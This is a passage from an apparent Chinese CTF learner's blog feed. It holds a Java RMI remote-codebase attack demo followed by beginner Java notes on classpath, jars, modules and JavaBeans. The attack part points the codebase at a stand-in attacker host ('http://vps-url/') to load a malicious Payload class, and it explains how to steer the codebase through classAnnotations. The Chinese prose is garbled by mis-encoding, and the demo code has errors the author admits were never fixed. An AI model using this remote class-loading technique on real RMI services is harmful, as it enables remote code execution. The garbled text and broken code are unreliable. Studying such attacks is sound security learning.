&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sum&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">param&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// RemoteRMIServer.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.registry.LocateRegistry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RemoteRMIServer&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Calc&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Calc&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6457&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;refObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RemoteRMIServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// client.java.policy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">grant&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">permission&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">security&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">AllPermission&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„é…ç½®å‘½ä»¤è¡Œå‚æ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -Djava.rmi.server.hostname&lt;span style="color:#f92672">=&lt;/span>192.168.31.175 -Djava.rmi.server.useCodebaseOnly&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">false&lt;/span> -Djava.sec
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>urity.policy&lt;span style="color:#f92672">=&lt;/span>client.policy RemoteRMIServer
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯è¿˜æ˜¯ä¼šå‡ºç°æŠ¥é”™ï¼Œjava.lang.ClassNotFoundExceptionæˆ–è€…java.security.AccessControlException: access deniedï¼ˆpolicyæ–‡ä»¶ä¹Ÿä¼ å…¥äº†å‘€ï¼‰ï¼Œæœäº†å¾ˆå¤šéƒ½æ²¡è§£å†³é—®é¢˜ï¼ˆçœŸçš„æœäº†å¾ˆå¤š ä½†æ˜¯éƒ½ä¸è¡Œï¼‰ï¼Œå…ˆæç½®äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// RMIClient.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.ArrayList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RMIClient&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Payload&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ICalc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://ip:port/refObj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">li&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Payload&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printIn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RMIClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -Djava.rmi.server.useCodebaseOnly&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">false&lt;/span> -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Djava.rmi.server.codebase&lt;span style="color:#f92672">=&lt;/span>http://vps-url/ RMIClient
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åˆ©ç”¨çš„è¯å°†classæ”¾åœ¨WebæœåŠ¡å™¨çš„ /RMIClient$Payload.classå³å¯&lt;/p>
&lt;p>codebaseé€šè¿‡è¿‡&lt;code>[Ljava.rmi.server.ObjID;&lt;/code>çš„&lt;code>classAnnotations&lt;/code>ï¼ˆç”±&lt;code>annotateClass&lt;/code>æ–¹æ³•å†™å…¥ï¼‰ä¼ é€’ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬æ²¡æœ‰RMIå®¢æˆ·ç«¯ï¼Œåªè¦ä¿®æ”¹&lt;code>classAnnotations&lt;/code>çš„å€¼å°±å¯ä»¥æ§åˆ¶codebaseï¼ŒæŒ‡å‘æˆ‘ä»¬çš„ç½‘ç«™&lt;/p>
&lt;hr>
&lt;p>å…¶å®ƒçš„è¯­æ³•ç­‰é‡åˆ°äº†å†å­¦ï¼Œä¼°è®¡è¿˜ä¼šæœ‰ä¸ªJavaè¯­æ³•è¡¥å…¨ä¸‹ç¯‡ï¼ˆå¦‚æœæˆ‘ä¸æ‡’çš„è¯&lt;/p></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â… </title><link>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</link><pubDate>Sun, 27 Feb 2022 01:28:17 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/27/java-study-notes-01/</guid><description>&lt;p>ctfé‡Œæœ‰å‡ ç±»é¢˜æˆ‘æ˜¯è§åˆ°ä¹‹åæ‹”è…¿å°±è·‘ï¼Œæ¯”å¦‚javaå’Œxssï¼Œå¯¹äºåè€…ï¼Œæœ€è¿‘æ‚ä¸ƒæ‚å…«çš„å­¦äº†å¾ˆå¤šjså’Œå‰ç«¯çš„çŸ¥è¯† æ²¡é‚£ä¹ˆå‘æ€µäº†ï¼Œè€Œå‰è€…â€¦â€¦ä¸å¤šè¯´äº†ï¼Œå­¦å­¦å­¦ï¼&lt;/p>
&lt;p>æœ¬ç¯‡å­¦ä¹ å†…å®¹æ¥è‡ªäº&lt;a href="https://www.liaoxuefeng.com/wiki/1252599548343744">å»–é›ªå³°Javaæ•™ç¨‹&lt;/a>ï¼Œä¸ªäººæ„Ÿè§‰æ¯”è¾ƒé€‚åˆå¯¹å…¶å®ƒè¯­è¨€ä¹Ÿæœ‰ä¸€ç‚¹æŒæ¡çš„äºº&lt;/p>
&lt;p>æœ¬æœºwin10ï¼Œä¸ºäº†å…¼å®¹ä¸€äº›ç¨‹åºæš‚æ—¶æœ‰java8å’Œ11ä¸¤ä¸ªç‰ˆï¼›ideä½¿ç”¨idea&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220226170711379.png" alt="image-20220226170711379">&lt;/p>
&lt;hr>
&lt;h2 id="javaåŸºç¡€">JavaåŸºç¡€&lt;/h2>
&lt;h3 id="javaç¨‹åºç»“æ„">javaç¨‹åºç»“æ„&lt;/h3>
&lt;ul>
&lt;li>src/xxx.javaï¼Œç±»åä¸ºæ–‡ä»¶åï¼Œmainä¸ºå…¥å£ï¼ˆideaç›´æ¥è¾“mainä¼šè‡ªåŠ¨è¡¥å…¨ï¼‰ï¼Œideaæ ¼å¼åŒ–ä»£ç ctrl+shift+F&lt;/li>
&lt;li>ç±»classä¹ æƒ¯å¤§å†™å­—æ¯å¼€å¤´ï¼Œæ–¹æ³•methodä¹ æƒ¯å°å†™å­—æ¯å¼€å¤´ï¼Œå¿…é¡»å¸¦åˆ†å·ï¼ˆä¸åŒäºjså¯æœ‰å¯æ— ï¼‰&lt;/li>
&lt;/ul>
&lt;h3 id="classpathjar">classpath&amp;amp;jar&lt;/h3>
&lt;ul>
&lt;li>&lt;code>classpath&lt;/code>æ˜¯JVMçš„ç¯å¢ƒå˜é‡ï¼Œæ˜¯ä¸€ç»„ç›®å½•çš„é›†åˆï¼ˆåˆ†éš”ç¬¦ç”±ç³»ç»Ÿå®š&lt;/li>
&lt;li>æ¨èåœ¨å¯åŠ¨JVMæ—¶è®¾ç½®&lt;code>classpath&lt;/code>å˜é‡ï¼Œä¸è¦æ±¡æŸ“ç³»ç»Ÿç¯å¢ƒï¼ˆå¯ä»¥æ”¾å¿ƒçš„äº¤ç»™idea&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -classpath .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>java -cp .&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\w&lt;/span>ork&lt;span style="color:#8045ff">\p&lt;/span>roject1&lt;span style="color:#8045ff">\b&lt;/span>in&lt;span style="color:#111">;&lt;/span>C:&lt;span style="color:#8045ff">\s&lt;/span>hared abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>ä¸è¦æŠŠä»»ä½•Javaæ ¸å¿ƒåº“æ·»åŠ åˆ°classpathä¸­ï¼é»˜è®¤çš„å½“å‰ç›®å½•&lt;code>.&lt;/code>å¯¹äºç»å¤§å¤šæ•°æƒ…å†µéƒ½å¤Ÿç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jaråŒ…å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©æ–‡ä»¶ï¼ŒåŒ…å«&lt;code>package&lt;/code>ç»„ç»‡çš„ç›®å½•å±‚çº§ï¼Œä»¥åŠå„ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬&lt;code>.class&lt;/code>æ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ï¼‰ï¼Œæ³¨æ„ä¸å«&lt;code>bin&lt;/code>ç›®å½•ï¼ˆæ³¨æ„å±‚çº§ï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯ä»¥æŠŠjarç†è§£ä¸ºnå¤šä¸ªclassæ–‡ä»¶çš„å®¹å™¨ï¼ŒJVMè‡ªå¸¦çš„Javaæ ‡å‡†åº“rt.jarä¹Ÿæ˜¯ä»¥jarå½¢å¼è¿›è¡Œå­˜æ”¾&lt;/p>
&lt;/li>
&lt;li>
&lt;p>jarä¸å…³å¿ƒclassä¹‹é—´çš„ä¾èµ–ï¼Œå¦‚æœæ¼æ‰çš„è¯åœ¨è¿è¡ŒæœŸææœ‰å¯èƒ½æŠ›å‡º&lt;code>ClassNotFoundException&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœæˆ‘ä»¬è¦æ‰§è¡Œä¸€ä¸ªjaråŒ…çš„&lt;code>class&lt;/code>ï¼Œå°±å¯ä»¥æŠŠjaråŒ…æ”¾åˆ°&lt;code>classpath&lt;/code>ä¸­&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>java -cp ./hello.jar abc.xyz.Hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>MANIFEST.MF&lt;/code>æ–‡ä»¶å¯ä»¥æä¾›jaråŒ…çš„ä¿¡æ¯ï¼Œå¦‚&lt;code>Main-Class&lt;/code>&lt;/li>
&lt;li>åˆ†æé¢˜ç›®ä¸­ç»™å‡ºjaråŒ…æ—¶æˆ‘ä¸€èˆ¬ç›´æ¥æ”¹zipè§£å‹ï¼Œç”¨ideaæ‰“å¼€æ•´ä¸ªç›®å½•ä½œä¸ºé¡¹ç›®ï¼ˆidea yyds&lt;/li>
&lt;/ul>
&lt;h3 id="æ¨¡å—">æ¨¡å—&lt;/h3>
&lt;ul>
&lt;li>Java9åå¼•å…¥ï¼Œè§£å†³ä¾èµ–é—®é¢˜ï¼Œæ§åˆ¶jarä¹‹é—´çš„ç›¸äº’è°ƒç”¨&lt;/li>
&lt;li>æŠŠä¸€å †classå°è£…ä¸ºjarä»…ä»…æ˜¯ä¸€ä¸ªæ‰“åŒ…çš„è¿‡ç¨‹ï¼Œè€ŒæŠŠä¸€å †classå°è£…ä¸ºæ¨¡å—åˆ™ä¸ä½†éœ€è¦æ‰“åŒ…ï¼Œè¿˜éœ€è¦å†™å…¥ä¾èµ–å…³ç³»ï¼Œå¹¶ä¸”è¿˜å¯ä»¥åŒ…å«äºŒè¿›åˆ¶ä»£ç ï¼ˆé€šå¸¸æ˜¯JNIæ‰©å±•ï¼‰&lt;/li>
&lt;li>ä»¥javaçš„æ ‡å‡†åº“rt.jarä¸ºä¾‹ï¼Œè¢«æ‹†ä¸º&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>java.base.jmod
java.compiler.jmod
java.datatransfer.jmod
java.desktop.jmod
...
&lt;/code>&lt;/pre>&lt;p>ä»¥&lt;code>.jmod&lt;/code>ä¸ºæ‹“å±•åæ ‡è¯†ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œæ¨¡å—&lt;code>java.base&lt;/code>å¯¹åº”çš„æ–‡ä»¶å°±æ˜¯&lt;code>java.base.jmod&lt;/code>&lt;/p>
&lt;ul>
&lt;li>æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å·²ç»è¢«å†™å…¥åˆ°æ¨¡å—å†…çš„&lt;code>module-info.class&lt;/code>æ–‡ä»¶äº†ã€‚æ‰€æœ‰çš„æ¨¡å—éƒ½ç›´æ¥æˆ–é—´æ¥åœ°ä¾èµ–&lt;code>java.base&lt;/code>æ¨¡å—ï¼Œåªæœ‰&lt;code>java.base&lt;/code>æ¨¡å—ä¸ä¾èµ–ä»»ä½•æ¨¡å—ï¼Œå®ƒå¯ä»¥è¢«çœ‹ä½œæ˜¯æ ¹æ¨¡å—ï¼Œå¥½æ¯”æ‰€æœ‰çš„ç±»éƒ½æ˜¯ä»&lt;code>Object&lt;/code>ç›´æ¥æˆ–é—´æ¥ç»§æ‰¿è€Œæ¥&lt;/li>
&lt;/ul>
&lt;p>ç¼–å†™æ¨¡å—çš„éƒ¨åˆ†æš‚ç•¥ã€‚&lt;/p>
&lt;h3 id="javabean">JavaBean&lt;/h3>
&lt;p>æŒ‡çš„æ˜¯ç¬¦åˆæŸç§è§„èŒƒçš„ä¸€ç§ç¼–ç¨‹æ¨¡å¼æˆ–ç¼–ç¨‹æ€æƒ³ï¼ˆä¸ªäººç†è§£&lt;/p>
&lt;p>éƒ¨åˆ†Pythonçˆ±å¥½è€…ä¹Ÿå–œæ¬¢è¿™ä¹ˆå†™ï¼Œå¯æ‹“å±•æ€§å¼ºï¼Œå°±æ˜¯å¾ˆè‡ƒè‚¿&lt;/p>
&lt;ul>
&lt;li>å†™æ–¹æ³•&lt;code>setter&lt;/code>ï¼Œè¯»æ–¹æ³•&lt;code>getter&lt;/code>ï¼Œåªæœ‰å…¶ä¸­ä¸€ç§å±æ€§ä¹‹ä¸€çš„è¢«ç§°ä¸ºåªå†™/è¯»å±æ€§â€”â€”æ»¡è¶³è¿™æ ·è§„èŒƒçš„classè¢«ç§°ä¸ºJavaBean&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// è¯»æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#75af00">getXyz&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™æ–¹æ³•:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setXyz&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Type&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>è¦æšä¸¾ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Javaæ ¸å¿ƒåº“æä¾›çš„&lt;code>Introspector&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.beans.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
